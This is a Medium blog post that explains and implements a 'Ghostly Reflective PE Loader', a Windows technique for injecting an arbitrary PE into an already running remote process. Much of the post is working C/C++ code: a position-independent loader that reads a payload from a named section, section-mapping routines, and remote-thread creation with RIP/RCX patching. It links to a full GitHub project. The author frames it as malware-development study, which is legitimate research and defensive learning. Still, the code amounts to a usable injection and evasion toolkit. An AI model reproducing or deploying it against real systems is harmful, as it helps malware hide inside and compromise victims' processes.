# https://captain-woof.medium.com/ghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0

[Sitemap](https://captain-woof.medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Ghostly Reflective PE Loader — how to make an existing remote process inject a PE in itself

[![Sohail Saha](https://miro.medium.com/v2/resize:fill:32:32/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg)](https://captain-woof.medium.com/?source=post_page---byline--3b65f2083de0---------------------------------------)

[Sohail Saha](https://captain-woof.medium.com/?source=post_page---byline--3b65f2083de0---------------------------------------)

10 min read

·

Mar 11, 2025

--

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D3b65f2083de0&operation=register&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&source=---header_actions--3b65f2083de0---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*peP_O41YLXg8G8P_sGjq3g.jpeg)

Source: Marco Polo (TV series)

I was studying Reflective DLL injection, a technique where a loader DLL is injected into a remote process, which then loads itself (hence the name “reflective”), and runs its DllMain entrypoint.

I wondered if I can instead inject an agnostic loader that doesn’t load itself, but rather any PE. Instead of directly mapping this PE into the remote process, what if the loader itself fetched it? That way, I could reuse my local PE loader, turn it into a remote PE loader.

## Here’s the idea

### Prerequisites

My idea makes use of a few concepts that I wrote about before. I highly recommend going through them, because we will be combining these two:

- [Writing a local PE Loader from scratch (for educational purposes)](https://captain-woof.medium.com/how-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc)
- [Ghostly Hollowing — probably the most bizarre Windows process injection technique I know](https://captain-woof.medium.com/ghostly-hollowing-probably-the-most-bizarre-windows-process-injection-technique-i-know-bf833c96663a)

In addition, you need to know a few Windows internals:

- Sections — [https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views)
- stdcall — [https://learn.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170](https://learn.microsoft.com/en-us/cpp/cpp/stdcall?view=msvc-170)
- fastcall — [https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170](https://learn.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170)

### Ghostly Hollowing — pros and cons

Ghostly Hollowing can only inject a PE into a newly created suspended process. It cannot inject into an already running process and keep its original threads going. It relies on patching the address of image base before the process gets a chance to resolve imports. That way, besides causing the loader to correctly resolve the injected PE’s imported functions, it also negates the need for relocations (owing to the patched base address). In addition, since the image is mapped with `SEC_IMAGE` , all the PE sections are correctly assigned their page protections.

**In short, Ghostly Hollowing can map a fully functional, ready to be invoked PE inside a process. It just cannot take care of relocations for an already running process.**

### Reflective DLL injections — pros and cons

Reflective DLL injection involves injecting a loader DLL into a remote process. This loader DLL exports a position-independent function that loads the DLL itself (resolving imports, relocations, assigning correct memory permissions, etc). Since it’s position independent, it won’t fail before the DLL is actually loaded. After this, the DLL’s `DllMain` entrypoint is called.

In addition, since the loader DLL loads itself, you are avoiding too many inter-process read/writes for the loading. The DLL loader can locally load itself, can’t it?

**In short, Reflective DLL injection can load any DLL in a remote process, but only if the DLL exports a position-independent function that can load itself.**

### Combining the two — Ghostly Reflective PE Injection

We can combine the above two techniques to cover each others’ cons. Here’s the idea — we split the Reflective DLL injection’s Loader DLL into three parts — **Injector**, **Loader** & actual **Target PE** (the one we actually aim to load).

1. Using Ghostly Hollowing, the **Injector** injects a position-independent **Loader** DLL in a remote process, and executes it. The need for relocations is negated. All necessary functions are resolved at runtime. Due to how Ghostly Hollowing works, this mapped DLL would show up under a blank image name.
2. A Reflective DLL loads itself (the entire payload is already available) as the Target PE. Taking inspiration from it, I instead wrote my Loader to read the **Target PE** from the system page file directly (you can make it read from any source).

**The Loader & Target PE are now decoupled! The loader can now locally load whatever PE it wants.**

### The outlining steps

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ybnKtYaIWCPiLMNwQS78gQ.png)

Click to enlarge

1. With Ghostly Hollowing, map the **Loader DLL** into remote process.
2. Create a new thread in remote process to invoke **Loader DLL**’s exported loading function (position independent). I name it `Load()` .
3. This loading function fetches the **Target PE** from system page file.
4. Fetched **Target PE** is then locally loaded and executed.

## Writing the Loader DLL

### Requirements

Let’s start with the Loader DLL. Here’s the requirements —

1. **Must be position-independent code:** All necessary functions must be resolved at runtime. Since the Loader can be injected into any process, it must only rely on `ntdll.dll` and `kernel32.dll` (sparingly). Every other functionality must be custom-implemented. In addition, no global variables can be used, because global variables are referenced by their offsets, and we do not have relocations yet.
2. **Must fetch the Target PE from system page file:** Using NT apis, it is possible to open a [named Section](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views) and read the Target PE contents from it.
3. **Must locally load Target PE:** Now that the Target PE contents are fetched in memory, it must be loaded and its entrypoint executed. I’ll be reusing my previous [Local PE loader](https://captain-woof.medium.com/how-to-write-a-local-pe-loader-from-scratch-for-educational-purposes-30e10cd88abc) code.

### Code

```
/*
---------------------------------------------------------------------------------------------------
This function is position independent, and loads the passed DLL content as a DLL

sectionName: UTF16-LE name of the Section from which to source the DLL contents
*/
extern "C" __declspec(dllexport) void Load(LPVOID sectionName) {
 // Initialise variables
 LPVOID pDllContents = NULL;
 SIZE_T dllContentsSize = 0;
 DWORD ntStatus = 0;
 HMODULE hNtdll = NULL;
 LPVOID pDllImage = NULL;
 DWORD entrypointOffset = 0;

 // Resolve necessary functions
 WINFUNC winFunc;
 if(!ResolveNecessaryFunctions(&winFunc, &hNtdll)) return;

 // Read DLL from Section

 //// Open section handle
 HANDLE hSectionDll = NULL;
 OBJECT_ATTRIBUTES dllSectionObjectAttributes{};
 RtlZeroMemoryCustom(&dllSectionObjectAttributes, sizeof(OBJECT_ATTRIBUTES));

 UNICODE_STRING sectionNameUnicodeString{};
 DWORD sectionNameLen = StringLenW((PWCHAR)sectionName);

 sectionNameUnicodeString.Buffer = (PWSTR)sectionName;
 sectionNameUnicodeString.MaximumLength = sectionNameLen * sizeof(WCHAR);
 sectionNameUnicodeString.Length = sectionNameLen * sizeof(WCHAR);

 InitializeObjectAttributes(
  &dllSectionObjectAttributes,
  &sectionNameUnicodeString,
  OBJ_CASE_INSENSITIVE,
  NULL,
  NULL
 );

 ntStatus = winFunc.pNtOpenSection(
  &hSectionDll,
  SECTION_MAP_READ | SECTION_MAP_WRITE,
  &dllSectionObjectAttributes
 );
 if (hSectionDll == NULL) goto CLEANUP;

 //// Map view of section into local process
 ntStatus = winFunc.pNtMapViewOfSection(
  hSectionDll,
  (HANDLE)-1,
  &pDllContents,
  NULL,
  NULL,
  NULL,
  &dllContentsSize,
  SECTION_INHERIT::ViewUnmap,
  NULL,
  PAGE_READWRITE
 );
 if (dllContentsSize == 0 || pDllContents == NULL) goto CLEANUP;

 // Decrypt DLL and restore signatures TODO

 // Load DLL
 LoadDll(&winFunc, hNtdll, pDllContents, &pDllImage, &entrypointOffset);
 if (pDllImage == NULL) goto CLEANUP;

 // Remove raw DLL contents
 if (pDllContents != NULL)
  winFunc.pNtUnmapViewOfSection(
   (HANDLE)-1,
   pDllContents
  );
 if (hSectionDll != NULL)
  winFunc.pNtClose(hSectionDll);

 // Jump to DLL's entrypoint
 JumpToEntry(&winFunc, entrypointOffset, pDllImage);

 // Cleanup
CLEANUP:
 // Cleanup in-mem DLL buffer
 if (pDllImage != NULL)
  winFunc.pNtFreeVirtualMemory(
   (HANDLE)-1,
   &pDllImage,
   0,
   MEM_RELEASE
  );

 // Exit current thread
 winFunc.pNtTerminateThread((HANDLE)NULL, (NTSTATUS)0);
}
```

Above is the Loader DLL’s exported `Load(LPVOID sectionName)` function, which accepts a section name, and reads the Target PE contents from it.

## Get Sohail Saha’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

The `LoadDll()` and `JumpToEntry()` are the same as my local PE loader. With the Target PE contents, you can now parse it, load it, and jump to its calculated entrypoint.

It is necessary to call `NtTerminateThread` manually. If not done, `return` will expect a pushed RIP on stack, which we won’t have, because we will have jumped directly to `Load` .

We must also remember to clean up after ourselves — closing all open handles, unmapping all mapped views, etc.

## Writing the Injector

At this stage, our Loader is ready. The injector needs to inject it into the remote process, and “call” its exported function `Load(LPVOID sectionName)` with fastcall.

### Creating a Named Section for Target PE

```
/*
-------------------------------------------------------------------------------------------------------
Function to create a named section for Target PE
*/
void CreateNamedSectionForTargetPE(bool injectLocal, IN PWINFUNC pWinFunc, IN LPVOID pDllContents, IN DWORD dllContentsSize, IN PHANDLE phFileMapping, IN OUT PWCHAR targetPESectionName, IN HANDLE hTargetProcess) {
 // Initialise
 bool isSuccess = false;
 LPVOID pDllContentsLocalMapped = NULL;
 ULONG objectNameLen = 0;
 POBJECT_NAME_INFORMATION pObjectNameInfo = NULL;

 // Create section backed by system page memory
 SECURITY_ATTRIBUTES fileMappingSecurityAttr{};
 fileMappingSecurityAttr.bInheritHandle = TRUE;
 fileMappingSecurityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
 *phFileMapping = CreateFileMappingW(
  INVALID_HANDLE_VALUE,
  &fileMappingSecurityAttr,
  PAGE_READWRITE,
  0,
  dllContentsSize,
  targetPESectionName
 );
 if (*phFileMapping == NULL) goto CLEANUP;

 // Update section name to fully qualified
 pWinFunc->pNTQueryObject( // It will fail first time because objectNameLen is 0
  *phFileMapping,
  (OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,
  pObjectNameInfo,
  0,
  &objectNameLen
 );
 if (objectNameLen != 0) {
  pObjectNameInfo = (POBJECT_NAME_INFORMATION)(HeapAlloc(
   GetProcessHeap(),
   HEAP_ZERO_MEMORY,
   objectNameLen
  ));
  if (pObjectNameInfo != NULL) {
   pWinFunc->pNTQueryObject(
    *phFileMapping,
    (OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,
    pObjectNameInfo,
    objectNameLen,
    &objectNameLen
   );

   if (pObjectNameInfo->Name.Buffer != NULL) {
    CopyBuffer((PBYTE)targetPESectionName, (PBYTE)(pObjectNameInfo->Name.Buffer), (pObjectNameInfo->Name.MaximumLength));
   }
  }
 }
 wprintf(L"Named section created for Target DLL: \"%s\"\n", targetPESectionName);

 // Map section to current process and write Target PE contents to it
 pDllContentsLocalMapped = MapViewOfFile(
  *phFileMapping,
  FILE_MAP_READ | FILE_MAP_WRITE,
  0,
  0,
  0
 );
 if (pDllContentsLocalMapped == NULL) goto CLEANUP;
 CopyBuffer((PBYTE)pDllContentsLocalMapped, (PBYTE)pDllContents, dllContentsSize); // TODO encrypt DLL contents
 printf("%d bytes target DLL payload written to named section (local mapped 0x%p)\n", dllContentsSize, pDllContentsLocalMapped);

 // Cleanup
CLEANUP:
 if (pDllContentsLocalMapped != NULL)
  UnmapViewOfFile(pDllContentsLocalMapped);

 if (pObjectNameInfo != NULL)
  HeapFree(GetProcessHeap(), 0, pObjectNameInfo);
}
```

Named sections can be session-specific or global, depending on the prefix used in the name. Even then, the actual section name ends up being prefixed with more stuff. It’s essential to get the fully qualified section name, because unlike Win32 APIs, NT APIs take only the full name. `NtQueryObject()` helps in retrieving this full name.

`CreateFileMappingW()` creates the named section, and `MapViewOfFile` maps it to the local process. Then it writes the raw Target PE content to this view, thus effectively preparing the named section for Loader.

### Creating a Ghost section for Loader DLL in remote process

This is exactly the same as the Ghostly Hollowing technique, so I won’t be showing it here again. With this, the Loader DLL is loaded into remote process, with all correct page-protections.

### Injecting Section Name for Target PE in remote process

The Loader DLL’s `Load(LPVOID sectionName)` function requires the address to the section name to use for fetching Target PE. This name must be first written at any address in the remote process, and that address must then be stored to pass to the `Load(LPVOID sectionName)` function.

```
/*
-------------------------------------------------------------------------------------------------------
Function to map the name of the named section (containg target PE payload) to Target process
*/
bool InjectSectionNameForTargetPEContentsInTargetProcess(bool injectLocal, IN HANDLE hTargetProcess, IN PWCHAR targetPESectionName, OUT PHANDLE phDllContentsSectionNameMappingTarget, OUT VOID **ppDllContentsSectionNameTarget) {
 // Create file mapping object
 DWORD targetPESectionNameSize = (StringLenW(targetPESectionName) + 1) * sizeof(WCHAR);
 *phDllContentsSectionNameMappingTarget = CreateFileMappingW(
  INVALID_HANDLE_VALUE,
  NULL,
  PAGE_READWRITE | SEC_COMMIT,
  0,
  targetPESectionNameSize,
  NULL
 );
 if (*phDllContentsSectionNameMappingTarget == NULL) return false;

 // Map view to local process and write the section name
 LPVOID targetPESectionNameLocal = MapViewOfFile(
  *phDllContentsSectionNameMappingTarget,
  FILE_MAP_WRITE,
  0,
  0,
  0
 );
 if (targetPESectionNameLocal == NULL) return false;
 CopyBuffer((PBYTE)targetPESectionNameLocal, (PBYTE)targetPESectionName, targetPESectionNameSize);

 //Map section to target process
 if (injectLocal)
  *ppDllContentsSectionNameTarget = targetPESectionNameLocal;
 else
  *ppDllContentsSectionNameTarget = MapViewOfFile3(
   *phDllContentsSectionNameMappingTarget,
   hTargetProcess,
   NULL,
   0,
   0,
   0,
   PAGE_READWRITE,
   NULL,
   0
  );

 if (*ppDllContentsSectionNameTarget == NULL) return false;
 printf("DLL contents section name mapped to target 0x%p\n", *ppDllContentsSectionNameTarget);
 return true;
}
```

### Invoking `Load()` in Loader

Since `Load(LPVOID sectionName)` takes a fastcall, additional patching is needed to make sure a new thread can correctly call this. That is because thread entrypoints are called with stdcall. A stdcall would pass arguments on stack, but fastcall expects it in registers. Since `sectionName` is the first argument, `Load()` expects it in the RCX register. In other words, RCX must hold the address to the section name. We create a new suspended thread, and set its thread context to set this RCX value.

In addition to this, the RIP is patched to store `Load()` ‘s address. This is because new threads don’t start executing from their entrypoints directly; there’s some initialisation code before that.

```
/*
-------------------------------------------------------------------------------------------------------
Invokes loader DLL
*/
bool InvokeLoaderDll(bool injectLocal, IN PWINFUNC pWinFunc, IN PWCHAR targetPESectionNameAddress, IN HANDLE hTargetProcess, IN DWORD targetProcessId, IN LPVOID pLoaderDllContents, IN VOID** ppDllLoaderInTargetBaseAddress) {
 // Initialisation
 ULONG processAllSize = 0;
 PSYSTEM_PROCESS_INFORMATION pProcessAll = NULL;
 PSYSTEM_PROCESS_INFORMATION pTargetProcessInfo = NULL;
 PSYSTEM_THREAD_INFORMATION pTargetThreadInfo = NULL;
 HANDLE hTargetThread = NULL;
 PIMAGE_NT_HEADERS pNtHeader = NULL;
 LPVOID dllLoaderInTargetAddressOfLoadFunction = NULL;
 bool isSuccess = false;

 // Find DLL loader's Load function offset
 dllLoaderInTargetAddressOfLoadFunction = ADD_OFFSET_TO_POINTER(*ppDllLoaderInTargetBaseAddress, GetProcAddressOffset(pLoaderDllContents, (PCHAR)"Load"));
 if (dllLoaderInTargetAddressOfLoadFunction == NULL) return false;

 /*
 Execute Loader DLL's Load() function

 For injecting locally, create new local thread
 For injecting remotely, hijack remote process's worker thread
 */
 if (injectLocal) {
  DWORD threadId = NULL;
  hTargetThread = CreateThread(
   NULL,
   0,
   (LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,
   NULL,
   CREATE_SUSPENDED,
   &threadId
  );
  if (hTargetThread == NULL) goto CLEANUP;
  printf("Local thread %d created for Target DLL execution, start address: 0x%p\n", threadId, dllLoaderInTargetAddressOfLoadFunction);
 }
 else {
  DWORD threadId = NULL;
  hTargetThread = CreateRemoteThread(
   hTargetProcess,
   NULL,
   0,
   (LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,
   NULL,
   CREATE_SUSPENDED,
   &threadId
  );
  if (hTargetThread == NULL) goto CLEANUP;
  printf("Remote thread %d created for Target DLL execution, start address: 0x%p\n", threadId, dllLoaderInTargetAddressOfLoadFunction);
 }
 if (hTargetThread == NULL) goto CLEANUP;

 // Get target thread context
 CONTEXT targetThreadContext;
 RtlZeroMemory(&targetThreadContext, sizeof(CONTEXT));
 targetThreadContext.ContextFlags = CONTEXT_ALL;
 if (!GetThreadContext(hTargetThread, &targetThreadContext)) goto CLEANUP;

 // Patch target thread's RIP to point to Entry point
 targetThreadContext.Rip = (DWORD64)dllLoaderInTargetAddressOfLoadFunction;
 targetThreadContext.Rcx = (DWORD64)targetPESectionNameAddress;
 if (!SetThreadContext(hTargetThread, &targetThreadContext)) goto CLEANUP;
 printf("Target thread's RIP set to 0x%p (start address)\n", dllLoaderInTargetAddressOfLoadFunction);
 printf("Target thread's RCX set to 0x%p (first param; address of section name for Target DLL)\n", targetPESectionNameAddress);

 // Resume process
 if (ResumeThread(hTargetThread) == -1) goto CLEANUP;
 printf("Target thread resumed\n");

 // Wait for target thread to finish
 printf("Waiting for target thread to finish\n");
 WaitForSingleObject(hTargetThread, INFINITE);
 printf("Target thread finished\n");

 isSuccess = true;

CLEANUP:
 if (!injectLocal && pProcessAll != NULL)
  HeapFree(GetProcessHeap(), 0, pProcessAll);

 if (hTargetThread != NULL) CloseHandle(hTargetThread);

 return isSuccess;
}
```

## Demo

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*L0qCs3WEQZGPw_SpYW3hIA.png)

Using Reflective Ghostly PE injection to inject a Messagebox DLL in remote process

And there you go — it works. It took me 3 days to write everything, troubleshoot the underlying issues, understand why certain things did not work, then finding workarounds.

## Full code

Here’s the full project.

[**malware-study/Ghostly Reflective PE Loader at main · captain-woof/malware-study** \\
\\
**My projects to understand malware development and detection. Use responsibly. I'm not responsible if you cause…**\\
\\
github.com](https://github.com/captain-woof/malware-study/tree/main/Ghostly%20Reflective%20PE%20Loader?source=post_page-----3b65f2083de0---------------------------------------)

Release builds will include standard C and C++ libraries for the Loader DLL, and certain things will break. You must remove them yourself. To test it out as is, use Debug build.

To help in debugging, `TestDLL` and `TestEXE` work as Target PEs. Inject either to see it in action. It pops a Messagebox. Further, `TestTargetProcess` runs indefinitely allowing `Injector` to work with it. In Startup projects, select both this and Injector, making sure Injector starts after TestTargetProcess.

## References

- [https://ntdoc.m417z.com/](https://ntdoc.m417z.com/) _{I LOVE THIS}_
- [https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views)

[Malware](https://medium.com/tag/malware?source=post_page-----3b65f2083de0---------------------------------------)

[Windows](https://medium.com/tag/windows?source=post_page-----3b65f2083de0---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----3b65f2083de0---------------------------------------)

[Penetration Testing](https://medium.com/tag/penetration-testing?source=post_page-----3b65f2083de0---------------------------------------)

[Windows Internals](https://medium.com/tag/windows-internals?source=post_page-----3b65f2083de0---------------------------------------)

[![Sohail Saha](https://miro.medium.com/v2/resize:fill:48:48/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg)](https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------)

[![Sohail Saha](https://miro.medium.com/v2/resize:fill:64:64/1*tAvZqv2EzW4YT6yFzKJnEw.jpeg)](https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------)

[**Written by Sohail Saha**](https://captain-woof.medium.com/?source=post_page---post_author_info--3b65f2083de0---------------------------------------)

[143 followers](https://captain-woof.medium.com/followers?source=post_page---post_author_info--3b65f2083de0---------------------------------------)

· [0 following](https://captain-woof.medium.com/following?source=post_page---post_author_info--3b65f2083de0---------------------------------------)

Cybersec noob

## Responses (1)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fcaptain-woof.medium.com%2Fghostly-reflective-pe-loader-how-to-make-a-remote-process-inject-a-pe-in-itself-3b65f2083de0&source=---post_responses--3b65f2083de0---------------------respond_sidebar------------------)

Cancel

Respond

See all responses

[Help](https://help.medium.com/hc/en-us?source=post_page-----3b65f2083de0---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----3b65f2083de0---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----3b65f2083de0---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3b65f2083de0---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----3b65f2083de0---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3b65f2083de0---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----3b65f2083de0---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3b65f2083de0---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----3b65f2083de0---------------------------------------)